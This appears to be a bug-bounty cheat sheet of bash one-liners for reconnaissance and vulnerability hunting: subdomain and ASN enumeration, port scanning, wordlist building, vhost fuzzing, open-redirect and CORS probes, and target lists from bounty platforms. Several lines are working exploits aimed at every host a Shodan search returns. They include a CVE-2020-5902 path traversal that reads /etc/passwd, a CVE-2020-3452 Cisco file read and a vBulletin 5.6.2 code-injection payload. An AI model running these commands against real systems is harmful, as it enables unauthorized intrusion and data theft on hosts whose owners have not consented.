# Get CIDR & Orgz from Target Lists
for DOMAIN in $(cat domains);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | uniq); done

# Ports Scan without CloudFlare
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

# Find All Allocated IP ranges for ASN given an IP address
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

# Get Subdomains from IPs
python3 hosthunter.py <target-ips.txt> > vhosts.txt

# Create Custom Wordlists
gau domain.com| unfurl -u keys | tee -a wordlist.txt ; gau domain.com | unfurl -u paths|tee -a ends.txt; sed 's#/#\n#g' ends.txt  | sort -u | tee -a wordlist.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' wordlist.txt
cat domains.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt  


# Find Hidden Servers and/or Admin Panels
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 

# Open-redirect
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

# CVE-2020-5902
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

# CVE-2020-3452
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt

# vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 

shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 

# spring
shodan search org:"$1" http.favicon.hash:116323821 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do ffuf -u http://$host/FUZZ -mc 200 -w spring-boot.txt ;done

# bin2hex
hexdump -v -e '1/1 "%02x"' "$1"

# cors 6 types 
gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;$url;else echo Nothing on "$url";fi;done
gau $1 | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
gau $1 | while read url;do target=$(curl -s -I -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
gau $1 | while read url;do target=$(curl -s -I -H "Origin: evil.$url" -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://not$site" -X GET "$url") | if grep 'Access-Control-Allow-Origin: https://not$site'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
gau $1 | while read url;do target=$(curl -s -I -H "Origin: $site.evil.com" -X GET "$url") | if grep "Origin: Access-Control-Allow-Origin: $site.evil.com";  then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done


assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null

cat $1 | gau   | head -n 5000 > google.txt; cat google.txt | sort -u | grep -a -i \=http > ssrf_redirects.txt


# Assets from chaos-bugbounty-list
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

# HackerOne Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv' | grep URL | awk '{print $1}' | tee -a allTargets
# BugCrowd Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv' | grep website | awk '{print $1}' | tee -a allTargets
# Intigriti Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv' | grep url | awk '{print $1}' | tee -a allTargets
# YesWeHack Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'| grep web | awk '{print $1}' | tee -a allTargets
# HackenProof Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'| grep Web  | awk '{print $1}' | tee -a allTargets
# Federacy Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'| grep website  | awk '{print $1}' | tee -a allTargets
